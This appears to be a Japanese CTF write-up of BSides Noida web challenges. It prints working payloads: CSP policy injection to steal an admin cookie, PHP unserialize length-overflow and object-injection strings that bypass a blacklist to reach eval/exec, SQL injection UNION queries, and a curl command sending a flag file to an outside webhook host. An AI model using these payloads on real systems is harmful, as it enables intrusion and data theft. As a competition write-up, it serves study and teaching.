# Web/Baby Web
nginx の try_files を利用して、sqlite の fileを取得する。
sqlite_master をみると flagsss というテーブルがある。
その中にフラグ
`BSNoida{4_v3ry_w4rm_w31c0m3_2_bs1d35_n01d4}`

# Web/Basic Notepad
injection 可能であるがCSPにより保護されている。
```
content-security-policy: script-src 'none'; object-src 'none'; base-uri 'none'; script-src-elem 'none'; report-uri /report/PUBXSyNRIWxxZNsFda6qtw
```

meta refresh で redirect させることができる。
UA が
`Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/92.0.4512.0 Safari/537.36`
で `HeadlessChrome` であることがわかる

`report/~/` の `~` の部分が `/review`のリクエストの query `token` の値と一致しているため、CSPに任意の値を入れることができる。

https://portswigger.net/research/bypassing-csp-with-policy-injection

あとはこの記事の通りにディレクティブをインジェクションし、cookie を取得し、admin なることで、フラグが得られる。
`BSNoida{s0me_b4s1c_CSP_1nj3ct10n}`


# Web/wowooo

```php
 <?php
include 'flag.php';
function filter($string){
    $filter = '/flag/i';
    return preg_replace($filter,'flagcc',$string);
}
$username=$_GET['name'];
$pass="V13tN4m_number_one";
$pass="Fl4g_in_V13tN4m";
$ser='a:2:{i:0;s:'.strlen($username).":\"$username\";i:1;s:".strlen($pass).":\"$pass\";}";

$authen = unserialize(filter($ser));

if($authen[1]==="V13tN4m_number_one "){
    echo $flag;
}
if (!isset($_GET['debug'])) {
    echo("PLSSS DONT HACK ME!!!!!!").PHP_EOL;
} else {
    highlight_file( __FILE__);
}
?>
<!-- debug --> 
```
`flag`　が `flagcc` に replace される前に `strlen` されるので、文字をあふれさせることができる。
`flag`の数*2 だけ文字があふれる。

挿入する文字列は `";i:1;s:19:"V13tN4m_number_one ";}`のようなものであればいい。
文字数は34 なので `flag` が　34/2=17 個あればよい。

`http://ctf.wowooo.bsidesnoida.in/?debug&name=flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag%22;i:1;s:19:%22V13tN4m_number_one%20%22;}`



`BSNoida{3z_ch4all_46481684185_!!!!!!@!}`

# Web/freepoint

```php
 <?php

include "config.php";
function filter($str) {
    if(preg_match("/system|exec|passthru|shell_exec|pcntl_exec|bin2hex|popen|scandir|hex2bin|[~$.^_`]|\'[a-z]|\"[a-z0-9]/i",$str)) {
        return false;
    } else {
        return true;
    }
}
class BSides {
    protected $option;
    protected $name;
    protected $note;

    function __construct() {
        $option = "no flag";
        $name = "guest";
        $note = "flag{flag_phake}";
        $this->load();
    }

    public function load()
    {
        if ($this->option === "no flag") {
            die("flag here ! :)");
        } else if ($this->option === "getFlag"){
            $this->loadFlag();
        } else {
            die("You don't need flag ?");
        }
    }
    private function loadFlag() {
        if (isset($this->note) && isset($this->name)) {
            if ($this->name === "admin") {
                if (filter($this->note) == 1) {
                    eval($this->note.";");
                } else {
                    die("18cm30p !! :< ");
                }
            }
        }
    }

    function __destruct() {
        $this->load();
    }
}

if (isset($_GET['ctf'])) {
    $ctf = (string)$_GET['ctf'];
    if (check($ctf)) { //check nullbytes
        unserialize($ctf);
    }
} else {
    highlight_file(__FILE__);
}
?>

```

```php
O:6:"BSides":3:{s:6:"option";s:7:"getFlag";s:4:"name";s:5:"admin";s:4:"note";s:42:"eval("\u{0065}cho \u{0065}xec(\" ls\");");";}
```
`unserialize` の時に うまくいくと 任意の文字列で `eval` 呼び出せる。

`O:6:"BSides":3:{s:6:"option";s:7:"getFlag";s:4:"name";s:5:"admin";s:4:"note";s:16:"flag{flag_phake}";}`
`eval` の呼び出しまでいける。

次に,
禁止されている文字列を unicode で回避して、flag を探す。

`find / -iname *flag*` -> flag のファイルなし

`find / -iname *fl*`　-> `/home/fl4g_ne_xxx.txt`

最終payload
```php
O:6:"BSides":3:{s:6:"option";s:7:"getFlag";s:4:"name";s:5:"admin";s:4:"note";s:203:"eval("\u{0065}cho \u{0065}xec(\" curl -X POST https:\u{002f}\u{002f}webhook\u{002e}site\u{002f}7cf663ce-b34d-48eb-ac96-0a5c6e6ab6b9 --data @\u{002f}home\u{002f}fl4g\u{005f}ne\u{005f}xxx\u{002e}txt\");");";}
```

`BSNoida{Fre3_fl4g_f04_y0u_@@55361988!!!}`



# Web/Baby Web Revenge

nginx でパラメータが禁止されているが、同じ名前のクエリを私用することで回避



sql injection 
テーブルの探索

```
GET /?chall_id=1&chall_id=1+UNION+SELECT+name,sql,NULL,NULL,NULL,NULL+FROM+sqlite_master+WHERE+TYPE='table'
```




フラグの取得

```
GET /?chall_id=1&chall_id=1+UNION+SELECT+flag,NULL,NULL,NULL,NULL,NULL+FROM+therealflags
```